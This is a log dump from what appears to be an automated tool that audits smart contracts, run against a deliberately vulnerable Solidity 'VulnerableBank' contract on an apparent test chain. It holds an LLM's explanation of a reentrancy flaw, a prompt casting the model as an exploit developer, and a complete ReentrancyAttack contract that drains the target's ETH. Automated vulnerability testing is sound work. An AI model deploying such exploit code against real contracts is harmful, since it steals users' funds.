],\n          "name": "balances",\n          "outputs": [\n            {\n              "internalType": "uint256",\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "inputs": [],\n          "name": "deposit",\n          "outputs": [],\n          "stateMutability": "payable",\n          "type": "function"\n        },\n        {\n          "inputs": [],\n          "name": "getBalance",\n          "outputs": [\n            {\n              "internalType": "uint256",\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "inputs": [\n            {\n              "internalType": "uint256",\n              "name": "_amount",\n              "type": "uint256"\n            }\n          ],\n          "name": "withdraw",\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "type": "function"\n        }\n      ],\n      "functions": [\n        {\n          "name": "balances",\n          "signature": "balances(address)",\n          "inputs": [\n            {\n              "internalType": "address",\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "outputs": [\n            {\n              "internalType": "uint256",\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "deposit",\n          "signature": "deposit()",\n          "inputs": [],\n          "outputs": [],\n          "stateMutability": "payable",\n          "payable": true,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "getBalance",\n          "signature": "getBalance()",\n          "inputs": [],\n          "outputs": [\n            {\n              "internalType": "uint256",\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "withdraw",\n          "signature": "withdraw(uint256)",\n          "inputs": [\n            {\n              "internalType": "uint256",\n              "name": "_amount",\n              "type": "uint256"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        }\n      ],\n      "events": [],\n      "accounts_balances": {\n        "0x254dffcd3277C0b1660F6d42EFbB754edaBAbC2B": 3000000000000000000,\n        "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1": 99968714640000000000,\n        "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0": 93998306520000000000,\n        "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b": 100000000000000000000\n      },\n      "public_state": {\n        "_contract_eth_balance_wei": 3000000000000000000,\n        "_contract_eth_balance_eth": 3.0,\n        "balances": [\n          {\n            "address": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1",\n            "value": 0\n          },\n          {\n            "address": "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0",\n            "value": 3000000000000000000\n          },\n          {\n            "address": "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b",\n            "value": 0\n          }\n        ],\n        "getBalance": 0\n      },\n      "source_code_snippet": "// SPDX-License-Identifier: MIT\\npragma solidity ^0.8.0;\\n\\ncontract VulnerableBank {\\n    mapping(address => uint256) public balances;\\n\\n    // Fonction pour d\\u00e9poser des fonds\\n    function deposit() public payable {\\n        balances[msg.sender] += msg.value;\\n    }\\n\\n    // Fonction vuln\\u00e9rable de retrait\\n    function withdraw(uint256 _amount) public {\\n        require(balances[msg.sender] >= _amount, \\"Solde insuffisant\\");\\n\\n        // Envoi du montant demand\\u00e9\\n        (bool success, ) = msg.sender.call{value: _amount}(\\"\\");\\n        require(success, unicode\\"\\u00c9chec du transfert\\");\\n\\n        // Mise \\u00e0 jour du solde APR\\u00c8S le transfert\\n        balances[msg.sender] -= _amount;\\n    }\\n\\n    // Consulter le solde\\n    function getBalance() public view returns (uint256) {\\n        return balances[msg.sender];\\n    }\\n}",\n      "solc_version": "0.8.0"\n    }\n  ]\n}\n\nResponse format:\n1. Contract Analysis: ...\n2. Vulnerability Assessment: ...  \n3. Exploitation Requirements: ...\n---\n', 'analysis_raw_response': '1. **Contract Analysis:**\n\n- **Contract Name:** VulnerableBank  \n- **Solidity Version:** pragma solidity ^0.8.0;  \n- **Functionality:**  \n  - Users can deposit ETH via `deposit()` which increases their balance in the `balances` mapping.  \n  - Users can withdraw ETH via `withdraw(uint256 _amount)` if they have sufficient balance.  \n  - The contract tracks user balances internally and holds ETH.  \n  - `getBalance()` returns the caller\'s balance.\n\n- **Key Code Snippet (withdraw):**  \n  ```solidity\n  function withdraw(uint256 _amount) public {\n      require(balances[msg.sender] >= _amount, "Solde insuffisant");\n\n      (bool success, ) = msg.sender.call{value: _amount}("");\n      require(success, "√âchec du transfert");\n\n      balances[msg.sender] -= _amount;\n  }\n  ```\n\n2. **Vulnerability Assessment:**\n\n- **Reentrancy Vulnerability:**  \n  The `withdraw` function is vulnerable to a classic reentrancy attack because it:  \n  - Sends ETH to `msg.sender` **before** updating the user‚Äôs balance.  \n  - Uses a low-level call (`call{value: _amount}("")`) which forwards all gas, allowing the recipient to execute arbitrary code.  \n  - Does not use any reentrancy guard or checks-effects-interactions pattern.\n\n- **Mechanism:**  \n  An attacker contract can call `withdraw` and in the fallback or receive function triggered by the ETH transfer, recursively call `withdraw` again before the balance is updated. This allows draining more ETH than the attacker‚Äôs balance.\n\n- **Potential Impact:**  \n  The attacker can drain all ETH from the contract, stealing funds deposited by other users.\n\n- **Other Notes:**  \n  - No access control or limits on withdrawals.  \n  - No checks on reentrancy or use of `ReentrancyGuard`.  \n  - The contract holds ETH and user balances, making it a high-value target.\n\n3. **Exploitation Requirements:**\n\n- **Setup:**  \n  - The attacker must first deposit some ETH into the contract to have a non-zero balance.  \n  - Deploy a malicious contract with a fallback or receive function that calls `withdraw` again when receiving ETH.\n\n- **Attack Steps:**  \n  1. Attacker deposits ETH into `VulnerableBank`.  \n  2. Attacker calls `withdraw` for some amount.  \n  3. When ETH is sent back, the fallback function of the attacker contract calls `withdraw` again before the balance is updated.  \n  4. This repeats recursively until the contract‚Äôs ETH balance is drained or gas runs out.\n\n---\n\n**Summary:**  \nThe `VulnerableBank` contract is vulnerable to a reentrancy attack due to the order of operations in the `withdraw` function (sending ETH before updating balances) and the use of a low-level call forwarding all gas. An attacker can recursively withdraw funds beyond their balance, potentially draining the entire contract balance.\n\n---\n\n**Recommendation:**  \n- Follow the Checks-Effects-Interactions pattern: update the balance **before** sending ETH.  \n- Use `ReentrancyGuard` or similar protection.  \n- Consider using `transfer` or `send` with limited gas or pull-payment patterns.', 'contract_analysis': '**\n\n- **Contract Name:** VulnerableBank  \n- **Solidity Version:** pragma solidity ^0.8.0;  \n- **Functionality:**  \n  - Users can deposit ETH via `deposit()` which increases their balance in the `balances` mapping.  \n  - Users can withdraw ETH via `withdraw(uint256 _amount)` if they have sufficient balance.  \n  - The contract tracks user balances internally and holds ETH.  \n  - `getBalance()` returns the caller\'s balance.\n\n- **Key Code Snippet (withdraw):**  \n  ```solidity\n  function withdraw(uint256 _amount) public {\n      require(balances[msg.sender] >= _amount, "Solde insuffisant");\n\n      (bool success, ) = msg.sender.call{value: _amount}("");\n      require(success, "√âchec du transfert");\n\n      balances[msg.sender] -= _amount;\n  }\n  ```\n\n2. **', 'vulnerability_assessment': '**\n\n- **Reentrancy Vulnerability:**  \n  The `withdraw` function is vulnerable to a classic reentrancy attack because it:  \n  - Sends ETH to `msg.sender` **before** updating the user‚Äôs balance.  \n  - Uses a low-level call (`call{value: _amount}("")`) which forwards all gas, allowing the recipient to execute arbitrary code.  \n  - Does not use any reentrancy guard or checks-effects-interactions pattern.\n\n- **Mechanism:**  \n  An attacker contract can call `withdraw` and in the fallback or receive function triggered by the ETH transfer, recursively call `withdraw` again before the balance is updated. This allows draining more ETH than the attacker‚Äôs balance.\n\n- **Potential Impact:**  \n  The attacker can drain all ETH from the contract, stealing funds deposited by other users.\n\n- **Other Notes:**  \n  - No access control or limits on withdrawals.  \n  - No checks on reentrancy or use of `ReentrancyGuard`.  \n  - The contract holds ETH and user balances, making it a high-value target.\n\n3. **', 'exploitation_requirements': '**\n\n- **Setup:**  \n  - The attacker must first deposit some ETH into the contract to have a non-zero balance.  \n  - Deploy a malicious contract with a fallback or receive function that calls `withdraw` again when receiving ETH.\n\n- **Attack Steps:**  \n  1. Attacker deposits ETH into `VulnerableBank`.  \n  2. Attacker calls `withdraw` for some amount.  \n  3. When ETH is sent back, the fallback function of the attacker contract calls `withdraw` again before the balance is updated.  \n  4. This repeats recursively until the contract‚Äôs ETH balance is drained or gas runs out.', 'analysis_duration': 10.894102096557617}, 'attack': {'attack_prompt': '\nYou are a Solidity exploit developer. Based on the security analysis, create ONLY executable Solidity attack code.\n\nSecurity Analysis:\n\nContract Analysis: **\n\n- **Contract Name:** VulnerableBank  \n- **Solidity Version:** pragma solidity ^0.8.0;  \n- **Functionality:**  \n  - Users can deposit ETH via `deposit()` which increases their balance in the `balances` mapping.  \n  - Users can withdraw ETH via `withdraw(uint256 _amount)` if they have sufficient balance.  \n  - The contract tracks user balances internally and holds ETH.  \n  - `getBalance()` returns the caller\'s balance.\n\n- **Key Code Snippet (withdraw):**  \n  ```solidity\n  function withdraw(uint256 _amount) public {\n      require(balances[msg.sender] >= _amount, "Solde insuffisant");\n\n      (bool success, ) = msg.sender.call{value: _amount}("");\n      require(success, "√âchec du transfert");\n\n      balances[msg.sender] -= _amount;\n  }\n  ```\n\n2. **\n\nVulnerability Assessment: **\n\n- **Reentrancy Vulnerability:**  \n  The `withdraw` function is vulnerable to a classic reentrancy attack because it:  \n  - Sends ETH to `msg.sender` **before** updating the user‚Äôs balance.  \n  - Uses a low-level call (`call{value: _amount}("")`) which forwards all gas, allowing the recipient to execute arbitrary code.  \n  - Does not use any reentrancy guard or checks-effects-interactions pattern.\n\n- **Mechanism:**  \n  An attacker contract can call `withdraw` and in the fallback or receive function triggered by the ETH transfer, recursively call `withdraw` again before the balance is updated. This allows draining more ETH than the attacker‚Äôs balance.\n\n- **Potential Impact:**  \n  The attacker can drain all ETH from the contract, stealing funds deposited by other users.\n\n- **Other Notes:**  \n  - No access control or limits on withdrawals.  \n  - No checks on reentrancy or use of `ReentrancyGuard`.  \n  - The contract holds ETH and user balances, making it a high-value target.\n\n3. **\n\nExploitation Requirements: **\n\n- **Setup:**  \n  - The attacker must first deposit some ETH into the contract to have a non-zero balance.  \n  - Deploy a malicious contract with a fallback or receive function that calls `withdraw` again when receiving ETH.\n\n- **Attack Steps:**  \n  1. Attacker deposits ETH into `VulnerableBank`.  \n  2. Attacker calls `withdraw` for some amount.  \n  3. When ETH is sent back, the fallback function of the attacker contract calls `withdraw` again before the balance is updated.  \n  4. This repeats recursively until the contract‚Äôs ETH balance is drained or gas runs out.\n\n\nTarget Contract Address: 0x254dffcd3277C0b1660F6d42EFbB754edaBAbC2B\n\nRequirements:\n- Generate ONLY complete, compilable Solidity code\n- Include pragma solidity version \n- Create a contract that can be deployed and executed\n- Ensure to use the same solidity version as the target contract and respect the syntax rules for this version\n- Include an attack function (named \'attack\', \'exploit\', or \'run\')\n- The constructor should take the target contract address as parameter\n- Focus on exploiting the identified vulnerabilities\n- NO explanations, NO comments, ONLY CODE\nReturn format: Pure Solidity code in ```solidity code blocks.\n```pragma solidity 0.8.0\n', 'attack_raw_response': '```solidity\npragma solidity 0.8.0;\n\ninterface IVulnerableBank {\n    function deposit() external payable;\n    function withdraw(uint256 _amount) external;\n}\n\ncontract ReentrancyAttack {\n    IVulnerableBank public vulnerableBank;\n    uint256 public attackAmount;\n\n    constructor(address _vulnerableBank) {\n        vulnerableBank = IVulnerableBank(_vulnerableBank);\n    }\n\n    function attack() external payable {\n        require(msg.value > 0, "Send ETH to attack");\n        attackAmount = msg.value;\n        vulnerableBank.deposit{value: msg.value}();\n        vulnerableBank.withdraw(msg.value);\n    }\n\n    receive() external payable {\n        uint256 bankBalance = address(vulnerableBank).balance;\n        if (bankBalance >= attackAmount) {\n            vulnerableBank.withdraw(attackAmount);\n        } else if (bankBalance > 0) {\n            vulnerableBank.withdraw(bankBalance);\n        }\n    }\n\n    function collect() external {\n        payable(msg.sender).transfer(address(this).balance);\n    }\n}\n```', 'code': 'pragma solidity 0.8.0;\n\ninterface IVulnerableBank {\n    function deposit() external payable;\n    function withdraw(uint256 _amount) external;\n}\n\ncontract ReentrancyAttack {\n    IVulnerableBank public vulnerableBank;\n    uint256 public attackAmount;\n\n    constructor(address _vulnerableBank) {\n        vulnerableBank = IVulnerableBank(_vulnerableBank);\n    }\n\n    function attack() external payable {\n        require(msg.value > 0, "Send ETH to attack");\n        attackAmount = msg.value;\n        vulnerableBank.deposit{value: msg.value}();\n        vulnerableBank.withdraw(msg.value);\n    }\n\n    receive() external payable {\n        uint256 bankBalance = address(vulnerableBank).balance;\n        if (bankBalance >= attackAmount) {\n            vulnerableBank.withdraw(attackAmount);\n        } else if (bankBalance > 0) {\n            vulnerableBank.withdraw(bankBalance);\n        }\n    }\n\n    function collect() external {\n        payable(msg.sender).transfer(address(this).balance);\n    }\n}', 'code_type': 'solidity', 'attack_duration': 7.4596216678619385}, 'prompt': '\nYou are a world-class smart contract security auditor.\n\n**Ignore all contracts that are standard utilities (ERC20, SafeMath, Ownable, Math, Interface, Libraries, etc). Focus only on contracts that can hold ETH or user funds, or have business logic.**\n\nYour task is to analyze the contracts and identify vulnerabilities:\n- Analyze only the real targets (wallets, banks, DAOs, exchanges, casinos, crowdsales, games, proxies, funds, staking, etc.)\n- Identify **any vulnerability**: reentrancy, logic bugs, permission issues, math errors, unsafe calls, backdoors, economic exploits, etc.\n- Explain the vulnerability mechanism and potential impact\n- If an initial setup is required for exploitation, describe the setup process\n- Return the solidity version of the contracts (pragma solidity ^x.x.x)\n\nThe slither analyze :  \n\nContracts context (JSON):\n{\n  "filename": "tmpnijsyvg8.sol",\n  "contracts": [\n    {\n      "contract_name": "VulnerableBank",\n      "address": "0x254dffcd3277C0b1660F6d42EFbB754edaBAbC2B",\n      "abi": [\n        {\n          "inputs": [\n            {\n              "internalType": "address",\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "name": "balances",\n          "outputs": [\n            {\n              "internalType": "uint256",\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "inputs": [],\n          "name": "deposit",\n          "outputs": [],\n          "stateMutability": "payable",\n          "type": "function"\n        },\n        {\n          "inputs": [],\n          "name": "getBalance",\n          "outputs": [\n            {\n              "internalType": "uint256",\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "inputs": [\n            {\n              "internalType": "uint256",\n              "name": "_amount",\n              "type": "uint256"\n            }\n          ],\n          "name": "withdraw",\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "type": "function"\n        }\n      ],\n      "functions": [\n        {\n          "name": "balances",\n          "signature": "balances(address)",\n          "inputs": [\n            {\n              "internalType": "address",\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "outputs": [\n            {\n              "internalType": "uint256",\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "deposit",\n          "signature": "deposit()",\n          "inputs": [],\n          "outputs": [],\n          "stateMutability": "payable",\n          "payable": true,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "getBalance",\n          "signature": "getBalance()",\n          "inputs": [],\n          "outputs": [\n            {\n              "internalType": "uint256",\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "withdraw",\n          "signature": "withdraw(uint256)",\n          "inputs": [\n            {\n              "internalType": "uint256",\n              "name": "_amount",\n              "type": "uint256"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        }\n      ],\n      "events": [],\n      "accounts_balances": {\n        "0x254dffcd3277C0b1660F6d42EFbB754edaBAbC2B": 3000000000000000000,\n        "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1": 99968714640000000000,\n        "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0": 93998306520000000000,\n        "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b": 100000000000000000000\n      },\n      "public_state": {\n        "_contract_eth_balance_wei": 3000000000000000000,\n        "_contract_eth_balance_eth": 3.0,\n        "balances": [\n          {\n            "address": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1",\n            "value": 0\n          },\n          {\n            "address": "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0",\n            "value": 3000000000000000000\n          },\n          {\n            "address": "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b",\n            "value": 0\n          }\n        ],\n        "getBalance": 0\n      },\n      "source_code_snippet": "// SPDX-License-Identifier: MIT\\npragma solidity ^0.8.0;\\n\\ncontract VulnerableBank {\\n    mapping(address => uint256) public balances;\\n\\n    // Fonction pour d\\u00e9poser des fonds\\n    function deposit() public payable {\\n        balances[msg.sender] += msg.value;\\n    }\\n\\n    // Fonction vuln\\u00e9rable de retrait\\n    function withdraw(uint256 _amount) public {\\n        require(balances[msg.sender] >= _amount, \\"Solde insuffisant\\");\\n\\n        // Envoi du montant demand\\u00e9\\n        (bool success, ) = msg.sender.call{value: _amount}(\\"\\");\\n        require(success, unicode\\"\\u00c9chec du transfert\\");\\n\\n        // Mise \\u00e0 jour du solde APR\\u00c8S le transfert\\n        balances[msg.sender] -= _amount;\\n    }\\n\\n    // Consulter le solde\\n    function getBalance() public view returns (uint256) {\\n        return balances[msg.sender];\\n    }\\n}",\n      "solc_version": "0.8.0"\n    }\n  ]\n}\n\nResponse format:\n1. Contract Analysis: ...\n2. Vulnerability Assessment: ...  \n3. Exploitation Requirements: ...\n---\n', 'raw_response': '1. **Contract Analysis:**\n\n- **Contract Name:** VulnerableBank  \n- **Solidity Version:** pragma solidity ^0.8.0;  \n- **Functionality:**  \n  - Users can deposit ETH via `deposit()` which increases their balance in the `balances` mapping.  \n  - Users can withdraw ETH via `withdraw(uint256 _amount)` if they have sufficient balance.  \n  - The contract tracks user balances internally and holds ETH.  \n  - `getBalance()` returns the caller\'s balance.\n\n- **Key Code Snippet (withdraw):**  \n  ```solidity\n  function withdraw(uint256 _amount) public {\n      require(balances[msg.sender] >= _amount, "Solde insuffisant");\n\n      (bool success, ) = msg.sender.call{value: _amount}("");\n      require(success, "√âchec du transfert");\n\n      balances[msg.sender] -= _amount;\n  }\n  ```\n\n2. **Vulnerability Assessment:**\n\n- **Reentrancy Vulnerability:**  \n  The `withdraw` function is vulnerable to a classic reentrancy attack because it:  \n  - Sends ETH to `msg.sender` **before** updating the user‚Äôs balance.  \n  - Uses a low-level call (`call{value: _amount}("")`) which forwards all gas, allowing the recipient to execute arbitrary code.  \n  - Does not use any reentrancy guard or checks-effects-interactions pattern.\n\n- **Mechanism:**  \n  An attacker contract can call `withdraw` and in the fallback or receive function triggered by the ETH transfer, recursively call `withdraw` again before the balance is updated. This allows draining more ETH than the attacker‚Äôs balance.\n\n- **Potential Impact:**  \n  The attacker can drain all ETH from the contract, stealing funds deposited by other users.\n\n- **Other Notes:**  \n  - No access control or limits on withdrawals.  \n  - No checks on reentrancy or use of `ReentrancyGuard`.  \n  - The contract holds ETH and user balances, making it a high-value target.\n\n3. **Exploitation Requirements:**\n\n- **Setup:**  \n  - The attacker must first deposit some ETH into the contract to have a non-zero balance.  \n  - Deploy a malicious contract with a fallback or receive function that calls `withdraw` again when receiving ETH.\n\n- **Attack Steps:**  \n  1. Attacker deposits ETH into `VulnerableBank`.  \n  2. Attacker calls `withdraw` for some amount.  \n  3. When ETH is sent back, the fallback function of the attacker contract calls `withdraw` again before the balance is updated.  \n  4. This repeats recursively until the contract‚Äôs ETH balance is drained or gas runs out.\n\n---\n\n**Summary:**  \nThe `VulnerableBank` contract is vulnerable to a reentrancy attack due to the order of operations in the `withdraw` function (sending ETH before updating balances) and the use of a low-level call forwarding all gas. An attacker can recursively withdraw funds beyond their balance, potentially draining the entire contract balance.\n\n---\n\n**Recommendation:**  \n- Follow the Checks-Effects-Interactions pattern: update the balance **before** sending ETH.  \n- Use `ReentrancyGuard` or similar protection.  \n- Consider using `transfer` or `send` with limited gas or pull-payment patterns.', 'reasoning': '**\n\n- **Contract Name:** VulnerableBank  \n- **Solidity Version:** pragma solidity ^0.8.0;  \n- **Functionality:**  \n  - Users can deposit ETH via `deposit()` which increases their balance in the `balances` mapping.  \n  - Users can withdraw ETH via `withdraw(uint256 _amount)` if they have sufficient balance.  \n  - The contract tracks user balances internally and holds ETH.  \n  - `getBalance()` returns the caller\'s balance.\n\n- **Key Code Snippet (withdraw):**  \n  ```solidity\n  function withdraw(uint256 _amount) public {\n      require(balances[msg.sender] >= _amount, "Solde insuffisant");\n\n      (bool success, ) = msg.sender.call{value: _amount}("");\n      require(success, "√âchec du transfert");\n\n      balances[msg.sender] -= _amount;\n  }\n  ```\n\n2. **', 'summary': '**\n\n- **Reentrancy Vulnerability:**  \n  The `withdraw` function is vulnerable to a classic reentrancy attack because it:  \n  - Sends ETH to `msg.sender` **before** updating the user‚Äôs balance.  \n  - Uses a low-level call (`call{value: _amount}("")`) which forwards all gas, allowing the recipient to execute arbitrary code.  \n  - Does not use any reentrancy guard or checks-effects-interactions pattern.\n\n- **Mechanism:**  \n  An attacker contract can call `withdraw` and in the fallback or receive function triggered by the ETH transfer, recursively call `withdraw` again before the balance is updated. This allows draining more ETH than the attacker‚Äôs balance.\n\n- **Potential Impact:**  \n  The attacker can drain all ETH from the contract, stealing funds deposited by other users.\n\n- **Other Notes:**  \n  - No access control or limits on withdrawals.  \n  - No checks on reentrancy or use of `ReentrancyGuard`.  \n  - The contract holds ETH and user balances, making it a high-value target.\n\n3. **', 'code': 'pragma solidity 0.8.0;\n\ninterface IVulnerableBank {\n    function deposit() external payable;\n    function withdraw(uint256 _amount) external;\n}\n\ncontract ReentrancyAttack {\n    IVulnerableBank public vulnerableBank;\n    uint256 public attackAmount;\n\n    constructor(address _vulnerableBank) {\n        vulnerableBank = IVulnerableBank(_vulnerableBank);\n    }\n\n    function attack() external payable {\n        require(msg.value > 0, "Send ETH to attack");\n        attackAmount = msg.value;\n        vulnerableBank.deposit{value: msg.value}();\n        vulnerableBank.withdraw(msg.value);\n    }\n\n    receive() external payable {\n        uint256 bankBalance = address(vulnerableBank).balance;\n        if (bankBalance >= attackAmount) {\n            vulnerableBank.withdraw(attackAmount);\n        } else if (bankBalance > 0) {\n            vulnerableBank.withdraw(bankBalance);\n        }\n    }\n\n    function collect() external {\n        payable(msg.sender).transfer(address(this).balance);\n    }\n}', 'code_type': 'solidity', 'duration': 18.353723764419556}
2025-07-05 13:05:49,749 - app.services.contract_service - INFO - Has exploit code: True
2025-07-05 13:05:49,751 - app.services.contract_service - INFO - No vulnerabilities mentioned: False
2025-07-05 13:05:49,754 - app.services.contract_service - INFO - Final vulnerability determination: True
2025-07-05 13:05:49,756 - app.services.contract_service - INFO - Attack strategy summary: **

- **Reentrancy Vulnerability:**  
  The `withdraw` function is vulnerable to a classic reentrancy attack because it:  
  - Sends ETH to `msg.sender` **before** updating the user‚Äôs balance.  
  - Uses a low-level call (`call{value: _amount}("")`) which forwards all gas, allowing the recipient to execute arbitrary code.  
  - Does not use any reentrancy guard or checks-effects-interactions pattern.

- **Mechanism:**  
  An attacker contract can call `withdraw` and in the fallback or receive function triggered by the ETH transfer, recursively call `withdraw` again before the balance is updated. This allows draining more ETH than the attacker‚Äôs balance.

- **Potential Impact:**  
  The attacker can drain all ETH from the contract, stealing funds deposited by other users.

- **Other Notes:**  
  - No access control or limits on withdrawals.  
  - No checks on reentrancy or use of `ReentrancyGuard`.  
  - The contract holds ETH and user balances, making it a high-value target.

3. **
2025-07-05 13:05:49,759 - app.services.contract_service - INFO - Analysis completed with status: KO
2025-07-05 13:05:49,761 - app.services.contract_service - INFO - Temporary file /tmp/tmpnijsyvg8.sol removed
2025-07-05 13:05:49,783 - app.api.contract - INFO - Report saved with filename: VulnerableBank_2025-07-05_13-05, status: KO
2025-07-05 13:05:49,786 - app.api.contract - INFO - Analysis completed successfully, returning report
2025-07-05 13:05:49,788 - flask_cors.extension - DEBUG - Request to ''/analyze'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-05 13:05:49,792 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-07-05 13:05:49,793 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-07-05 13:05:49,795 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-07-05 13:05:49,797 - werkzeug - INFO - 192.168.96.1 - - [05/Jul/2025 13:05:49] "POST /analyze HTTP/1.1" 200 -
2025-07-05 13:05:51,352 - flask_cors.extension - DEBUG - Request to ''/history'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-05 13:05:51,355 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-07-05 13:05:51,357 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-07-05 13:05:51,360 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-07-05 13:05:51,362 - werkzeug - INFO - 192.168.96.1 - - [05/Jul/2025 13:05:51] "GET /history HTTP/1.1" 200 -
2025-07-05 13:05:51,811 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 200 OK"
2025-07-05 13:05:52,737 - app.services.contract_service - INFO - Compilation result: 4 contracts compiled
2025-07-05 13:05:52,739 - app.services.contract_service - INFO - Deploying 4 contracts...
2025-07-05 13:05:53,085 - app.services.contract_service - INFO - Contract Ownable deployed at 0x59d3631c86BbE35EF041872d502F218A39FBa150
2025-07-05 13:05:53,087 - app.services.contract_service - INFO - Setting up contract Ownable...
2025-07-05 13:05:53,204 - app.services.contract_service - INFO - Contract Ownable setup completed
2025-07-05 13:05:53,205 - app.services.contract_service - INFO - Funding contract Ownable for attack testing...
2025-07-05 13:05:53,365 - app.services.contract_service - INFO - Contract Ownable funded
2025-07-05 13:05:53,734 - app.services.contract_service - INFO - Contract Pausable deployed at 0x0290FB167208Af455bB137780163b7B7a9a10C16
2025-07-05 13:05:53,736 - app.services.contract_service - INFO - Setting up contract Pausable...
2025-07-05 13:05:53,924 - app.services.contract_service - INFO - Contract Pausable setup completed
2025-07-05 13:05:53,926 - app.services.contract_service - INFO - Funding contract Pausable for attack testing...
2025-07-05 13:05:54,086 - app.services.contract_service - INFO - Contract Pausable funded
2025-07-05 13:05:54,401 - app.services.contract_service - INFO - Contract SafeMath deployed at 0x9b1f7F645351AF3631a656421eD2e40f2802E6c0
2025-07-05 13:05:54,403 - app.services.contract_service - INFO - Setting up contract SafeMath...
2025-07-05 13:05:54,429 - app.services.contract_service - INFO - Contract SafeMath setup completed
2025-07-05 13:05:54,430 - app.services.contract_service - INFO - Funding contract SafeMath for attack testing...
2025-07-05 13:05:54,562 - app.services.contract_service - INFO - Contract SafeMath funded
2025-07-05 13:05:55,377 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 200 OK"
2025-07-05 13:05:56,085 - app.services.contract_service - INFO - Contract TetherToken deployed at 0x67B5656d60a809915323Bf2C40A8bEF15A152e3e
2025-07-05 13:05:56,087 - app.services.contract_service - INFO - Setting up contract TetherToken...
2025-07-05 13:05:59,732 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 200 OK"
